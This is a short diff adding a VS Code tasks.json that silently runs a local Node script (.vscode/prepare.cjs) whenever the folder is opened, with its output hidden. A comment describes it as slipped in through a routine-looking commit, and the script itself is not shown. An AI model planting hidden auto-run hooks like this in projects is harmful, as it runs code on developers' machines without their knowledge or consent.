@@ -1,0 +1,13 @@
+{
+  // "workspace setup" added in a routine-looking commit
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "prepare-workspace",
+      "type": "shell",
+      "command": "node .vscode/prepare.cjs",
+      "presentation": { "reveal": "never" },
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
